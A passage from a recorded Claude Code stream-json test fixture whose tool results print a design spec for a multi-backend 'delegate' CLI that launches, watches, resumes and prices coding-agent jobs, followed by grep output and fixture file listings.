agent, I want a second read-write job in the same directory refused with BUSY, so that two delegates never interleave edits.\\n13. As an orchestrating agent, I want that lock to hold across separate host sessions, so that two Claude sessions cannot collide in one tree.\\n14. As an orchestrating agent, I want to give a gate command the tool runs after the agent, so that I get ground-truth verification instead of the delegate's claim.\\n15. As an orchestrating agent, I want a failing gate to downgrade DONE to DONE_WITH_CONCERNS with the gate's output, so that I see what failed.\\n16. As an orchestrating agent, I want the result to include the git change-set the tool computed, so that I know what actually changed.\\n17. As an orchestrating agent, I want a concern when commits landed but the tree is still dirty, so that half-committed work is visible.\\n18. As an orchestrating agent, I want to widen the tool-call idle window for one job, so that a long build or benchmark is not killed as hung.\\n19. As an orchestrating agent, I want a job that goes silent past its idle window killed and reported, so that hung jobs end on their own.\\n20. As an orchestrating agent, I want to wait on one or many jobs with `delegate watch` in a background shell, so that my turn can end and I get one notification when they finish.\\n21. As an orchestrating agent, I want `delegate watch` to print every job's final record, so that one command both waits and delivers results.\\n22. As an orchestrating agent, I want `delegate watch` to stop at a timeout, so that a missing or never-written record cannot hang it forever.\\n23. As an orchestrating agent, I want to read a job's progress by reading its status file, so that polling needs no tool.\\n24. As an orchestrating agent, I want the status file to carry a heartbeat while running, so that I can tell a dead supervisor from a slow job.\\n25. As an orchestrating agent, I want the final status file to hold the full result (status, text, usage, cost, change-set, gate result, session), so that the file is the whole answer.\\n26. As an orchestrating agent, I want the delegate's final STATUS line to set the result status, including NEEDS_CONTEXT, so that I know when it needs me.\\n27. As an orchestrating agent, I want to resume any finished job with a follow-up prompt, so that I can answer a question or ask for fixes without re-briefing.\\n28. As an orchestrating agent, I want resume to reuse the job's model, directory, capability and gate, so that I cannot forget a setting on the follow-up.\\n29. As an orchestrating agent, I want to override capability, gate or model on resume, so that a read-only reviewer can go on to fix what it found.\\n30. As an orchestrating agent, I want a model override that crosses backends rejected, so that I never try to resume a cursor session in pi.\\n31. As an orchestrating agent, I want resume to work after the host session or machine sleep, until reboot, so that follow-ups do not depend on a live server.\\n32. As an orchestrating agent, I want resume to return a new job id, so that each run has its own record.\\n33. As an orchestrating agent, I want to cancel a job by id, so that I can stop a runaway delegate and the commands it started.\\n34. As an orchestrating agent, I want `delegate models` to list ids, labels, backends and prices, so that I can pick a model without reading config.\\n35. As a user, I want to see per-run cost, so that I know what delegation would cost at list prices.\\n36. As a user, I want cursor runs priced from the model table and pi and claude runs to report their own cost, so that no backend's pricing is reimplemented.\\n37. As a user, I want prices for every model in the model table, so that `delegate models` shows them all.\\n38. As a user, I want `delegate doctor` to check each backend's binary, version and login, so that setup problems show before a run fails.\\n39. As a user, I want doctor to check each configured model is available on its backend, so that renamed or retired models (Grok 4.6 to 4.7) show as warnings.\\n40. As a user, I want pi and Claude Code to run with my full configuration (extensions, plugins, skills, context files), so that delegates behave as they do when I run them.\\n41. As a user, I want cursor read-write runs unsandboxed, so that delegates can clone, push and open PRs.\\n42. As a user, I want Claude Code read-write runs in auto permission mode, so that its classifier still screens tool calls.\\n43. As a user, I want Claude Code read-only runs in plan permission mode, so that they cannot edit.\\n44. As a user, I want the model list trimmed to models I use, so that the menu is short.\\n45. As a user, I want Composer 2.5, Grok 4.7 high and xhigh from cursor; muse-spark-1.3-contributor, glm-5.3-flash, deepseek-v4.1-flash from opencode-go via pi; gpt-6-astra, gpt-6-luna, gpt-6.1-sol from openai-codex via pi; and Claude Opus 5.5, Sonnet 5.5, Fable 5.1 via Claude Code.\\n46. As a user, I want the project renamed from cursor-delegate to delegate everywhere (binary, config directory, environment variable, status-file directory, skill, repo), so that the name matches what it does.\\n47. As a user, I want my existing host profile moved to the new config location by setup, so that my settings survive the rename.\\n48. As a user, I want setup to build the binary and put `delegate` on my PATH, so that every harness can call it.\\n49. As a user, I want the skill to show briefs that say \\\"do not delegate further\\\", so that a delegated Claude does not loop back through delegate.\\n50. As a user, I want my global instructions to allow local Opus 5.5 and Sonnet 5.5 subagents and route other delegation through `delegate`, so that the Max plan is used where it fits.\\n51. As a user, I want the skill to make the background watcher the waiting path, so that agents stop holding turns open.\\n52. As a user, I want the skill rewritten for the new surface (catalog, model picks, resume, gates, watcher), so that it stays the single source of usage guidance.\\n53. As a maintainer, I want each backend to own its argument building, capability mapping, output parsing, resume method and doctor checks, so that adding a harness touches one place.\\n54. As a maintainer, I want parsers tested against output recorded from real headless runs, so that a CLI upgrade that changes its stream breaks a test.\\n55. As a maintainer, I want opt-in live tests per backend that also record fresh fixtures, so that fixtures stay current.\\n56. As a maintainer, I want latency budgets on every command, so that performance regressions fail tests.\\n57. As a maintainer, I want a memory budget on the per-job supervisor, so that a job's footprint stays small.\\n58. As a maintainer, I want CI on Linux running format, lint and tests, so that breakage on my other platform is caught; macOS runs locally.\\n59. As a maintainer, I want dead docs (old reproduction spec, July/August plans and specs, code review notes) and the parity snapshot removed, so that the repo describes only what exists.\\n\\n## Implementation Decisions\\n\\n**Surface.** The MCP server is removed. The CLI is:\\n\\n```\\ndelegate run    --model M [--capability read-only|read-write] [--cwd D] [--gate CMD] [--tool-idle-ms N] [--prompt-file F | stdin]\\ndelegate resume <jobId> [--model M] [--capability C] [--gate CMD] [--prompt-file F | stdin]\\ndelegate cancel <jobId>\\ndelegate watch  <jobId>... [--timeout S]\\ndelegate doctor\\ndelegate models\\n```\\n\\nRemoved with no replacement: `cursor_poll`, `cursor_wait`, `cursor_wait_any`, `cursor_wait_all`, `cursor_answer`; parameters `waitMs`, `background`, `session`, `isolation`, `verifyCommands`, `allowPartialCommit`, `idleMs`, `requireNonClaude`, `allowUnsandboxed`; capabilities `plan` and `write-unsandboxed`; host-profile fields `promptPreamble`, `verifyCommands`, `requiredDeny`, `deadlineMs`; the deny-list check; BackendProvided worktrees; MCP progress notifications; the `family` model field; the doctor plugin-registration and legacy-name checks.\\n\\n**Job model.** `run` validates input, writes the initial status record, spawns a detached supervisor (own session and process group, stdio redirected), prints the job id and exits. The supervisor runs the backend child, the idle watchdog, the gate and the git change-set, and writes the status record at start, on a heartbeat while running, and at the terminal transition. The status record is the source of truth for every command after `run`; there is no in-memory registry.\\n\\n**Status record.** One JSON file per job in `$TMPDIR/delegate-jobs/`. While running: status, heartbeat timestamp, progress snapshot, supervisor pid. When terminal: status and the full result. It also stores what resume needs: backend session id, model, cwd, capability, gate, tool-idle window. Records live until reboot and are not cleaned up.\\n\\n**Write lock.** A lock file per resolved `cwd`, held by the supervisor of a read-write job. A second read-write `run` or `resume` in the same `cwd` returns BUSY with the holder's job id. Works across host sessions.\\n\\n**Resume.** Reads the job's status record, applies overrides, rejects a model override on a different backend, and starts a new job continuing the backend session. Works on any terminal status.\\n\\n**Cancel.** Reads the supervisor pid from the record and signals its process group; the record ends CANCELLED.\\n\\n**Watch.** Blocks until every named record is terminal or the timeout passes, then prints each record. No external dependencies.\\n\\n**Backends.** Selected by a `backend` field on each model in the model table. Each backend provides: binary resolution, argument building from (model, capability, cwd, session), a stream parser that yields the existing progress snapshot and a normalized result (text, session id, usage, optional reported cost, error), a resume method, and doctor checks.\\n\\n- **cursor**: `cursor-agent --print --output-format stream-json --trust --approve-mcps --force`. read-only is ask mode; read-write is `--sandbox disabled`. Resume by the session id from the result line. Cost from the model table.\\n- **pi**: `pi -p --mode json --model provider/id`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume reuses it. read-only is rejected. Cost is pi's own reported cost.\\n- **claude**: `claude -p --output-format stream-json --verbose --model ...`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume with `--resume`. read-only is `--permission-mode plan`; read-write is `--permission-mode auto`. Cost is the result line's `total_cost_usd`. The stream closely matches cursor's, so the parser should share most of cursor's.\\n\\n**Model table.** Bundled JSON: `default` plus, per id, `{label, backend, price}`. Prices are kept for every model for display; only cursor uses them to compute cost. Pi model ids use pi's `provider/model` form. Default is `composer-2.5`. Grok 4.7 ids are `grok-4.7-high` / `grok-4.7-xhigh` (no `cursor-` prefix), priced as Grok 4.6.\\n\\n**Prompt composition.** The tool adds only the STATUS-line instruction to the caller's prompt; the result status is parsed from that line.\\n\\n**Doctor.** Plugin/binary version; per backend: binary found, version, login (cursor `about`, pi `auth check`, claude equivalent); per model: available on its backend (cursor `--list-models`, pi `auth check --model`). Missing models are warnings.\\n\\n**Rename.** Binary `delegate`; config at `~/.config/delegate/` with `DELEGATE_HOST_PROFILE` override; setup moves the old profile file. The Claude plugin ships the skill only. The Codex plugin manifest is dropped since nothing needs registering. The GitHub repo and local directory were renamed on 2026-10-01. The user's global agent instructions and agent memory are updated to the new names.\\n\\n**Skill.** Rewritten for the CLI: model picks and catalog over the new ids, read-only/read-write, cwd, gates, resume with overrides, the background `delegate watch` as the only documented waiting path, and a \\\"do not delegate further\\\" line for briefs. The plan-writer brief points at resume.\\n\\n**Delivery order.** (1) CLI conversion with all trims and the rename, cursor only, plus CI; (2) backend split behind the interface; (3) pi backend; (4) claude backend.\\n\\n## Testing Decisions\\n\\nA good test drives the `delegate` binary as a real process and asserts on what a caller sees: command output, exit status, and status-file contents. It does not reach into internal modules.\\n\\n- **Primary seam: the CLI against fake agent binaries.** Extends the existing end-to-end tests, which already run the real binary with a shell-script fake cursor-agent selected by an environment variable. Each backend gets a fake that replays a recorded stream. Covers run/detach, BUSY across processes, watchdog kill, gate pass/fail, change-set, NEEDS_CONTEXT, resume with and without overrides, cross-backend override rejection, resume after the original process is gone, cancel killing the process group, watch timeout, doctor, models.\\n- **Parser seam: one per backend, on recorded headless output.** Prior art: the cursor adapter's stream tests. Fixtures are raw stdout captured from real headless runs, not stored session files (pi session files, Claude transcripts and Cursor chat stores are different formats). Use past sessions to choose realistic tasks to record: long tool output, many tool calls, resume, errors.\\n- **Live tests, opt-in.** One real round trip per backend, ignored by default, like the existing live test. They save raw stdout as fresh fixtures. They also settle two open behaviours: whether headless plan mode in Claude answers rather than proposing a plan, and how often auto mode refuses calls.\\n- **Latency budgets.** Every command is timed against fake agents. `run` returning its job id matters most. Budgets are set at about 3x the local measurement so CI noise does not trip them.\\n- **Memory budget.** The supervisor's resident memory is measured while a fake agent runs. Replaces the old idle-server memory gate.\\n- **CI.** GitHub Actions on Linux: format check, clippy with warnings as errors, tests. Live tests excluded. macOS runs locally. The suite currently takes about 5 seconds warm, 5 seconds clean build.\\n\\n## Out of Scope\\n\\n- A separate Codex backend; Codex models are reached through pi's openai-codex provider.\\n- Fiber as a backend (waits for `fiber ask`).\\n- Sandboxing any backend, or a seatbelt wrapper for pi.\\n- Read-only mode for pi.\\n- Server-created worktrees; callers create their own and pass `--cwd`.\\n- Cleanup of old status records.\\n- Reading pi's model catalog at runtime for prices.\\n- Tiered (long-context) pricing in the model table.\\n- Keeping MCP as a second interface.\\n\\n## Further Notes\\n\\n- Usage numbers come from 413 deduplicated `cursor_run` calls in local Claude transcripts.\\n- Headless Claude auto mode cannot prompt, so calls its classifier will not auto-approve are refused. If that proves frequent, revisit.\\n- If headless plan mode misbehaves, fall back to blocking the edit tools for read-only Claude runs.\\n- A delegated Claude or pi loads this skill and the user's global instructions, so briefs must say \\\"do not delegate further\\\" to stop loops.\\n- Superseded design notes: the multi-backend idea doc, which this spec replaces.\",\"stderr\":\"\",\"interrupted\":false,\"isImage\":false,\"noOutputExpected\":false}}\ntests/fixtures/claude/review-18.stdout:29:{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"type\":\"tool_result\",\"content\":\"Exit code 1\\n21:The tool has also grown more surface than it uses. Across 413 real `cursor_run` calls, every one ran in the background, `plan` capability was never used, `allowPartialCommit` and `idleMs` were never set, `cursor_wait_any` ran twice, and several parameters (`verifyCommands`, `promptPreamble`, `requireNonClaude`, the `allowUnsandboxed` second signal) only add prompt text or guard against cases that never happen. Eight MCP tools and fourteen run parameters cost schema tokens in every session and make the skill long.\\n60:28. As an orchestrating agent, I want resume to reuse the job's model, directory, capability and gate, so that I cannot forget a setting on the follow-up.\\n73:41. As a user, I want cursor read-write runs unsandboxed, so that delegates can clone, push and open PRs.\\n79:47. As a user, I want my existing host profile moved to the new config location by setup, so that my settings survive the rename.\\n98:delegate run    --model M [--capability read-only|read-write] [--cwd D] [--gate CMD] [--tool-idle-ms N] [--prompt-file F | stdin]\\n99:delegate resume <jobId> [--model M] [--capability C] [--gate CMD] [--prompt-file F | stdin]\\n106:Removed with no replacement: `cursor_poll`, `cursor_wait`, `cursor_wait_any`, `cursor_wait_all`, `cursor_answer`; parameters `waitMs`, `background`, `session`, `isolation`, `verifyCommands`, `allowPartialCommit`, `idleMs`, `requireNonClaude`, `allowUnsandboxed`; capabilities `plan` and `write-unsandboxed`; host-profile fields `promptPreamble`, `verifyCommands`, `requiredDeny`, `deadlineMs`; the deny-list check; BackendProvided worktrees; MCP progress notifications; the `family` model field; the doctor plugin-registration and legacy-name checks.\\n122:- **cursor**: `cursor-agent --print --output-format stream-json --trust --approve-mcps --force`. read-only is ask mode; read-write is `--sandbox disabled`. Resume by the session id from the result line. Cost from the model table.\\n123:- **pi**: `pi -p --mode json --model provider/id`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume reuses it. read-only is rejected. Cost is pi's own reported cost.\\n124:- **claude**: `claude -p --output-format stream-json --verbose --model ...`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume with `--resume`. read-only is `--permission-mode plan`; read-write is `--permission-mode auto`. Cost is the result line's `total_cost_usd`. The stream closely matches cursor's, so the parser should share most of cursor's.\\n130:**Doctor.** Plugin/binary version; per backend: binary found, version, login (cursor `about`, pi `auth check`, claude equivalent); per model: available on its backend (cursor `--list-models`, pi `auth check --model`). Missing models are warnings.\\n153:- Sandboxing any backend, or a seatbelt wrapper for pi.\\ncursor/lane-8-ci-repair.stdout\\ncursor/ponytail-19.stdout\\ncursor/lane-8-ci-repair.argv\\ncursor/preflight-7.stdout\\ncursor/preflight-7.argv\\ncursor/ponytail-19.argv\\ncursor/ponytail-18.argv\\ncursor/lane-8-ci.stdout\\ncursor/ponytail-18.stdout\\nclaude/review-19.stdout\\n  35 /Users/user\\n 186 /Users/user\\nclaude/review-18.stdout\\n1.7M\\t.\\n  431970 cursor/ponytail-18.stdout\\n  175819 cursor/preflight-7.stdout\\n  174974 pi/cancelled.stdout\\n  782763 total\",\"is_error\":true,\"tool_use_id\":\"toolu_019cExtXuYqSGwSxpUdYaKTt\"}]},\"parent_tool_use_id\":null,\"session_id\":\"3dfd18ba-a3ed-4a44-bd90-c4ca03e8efdd\",\"uuid\":\"797cfe15-0894-4fe8-8311-9be1f92b1294\",\"timestamp\":\"2026-10-01T08:27:17.686Z\",\"tool_use_result\":\"Error: Exit code 1\\n21:The tool has also grown more surface than it uses. Across 413 real `cursor_run` calls, every one ran in the background, `plan` capability was never used, `allowPartialCommit` and `idleMs` were never set, `cursor_wait_any` ran twice, and several parameters (`verifyCommands`, `promptPreamble`, `requireNonClaude`, the `al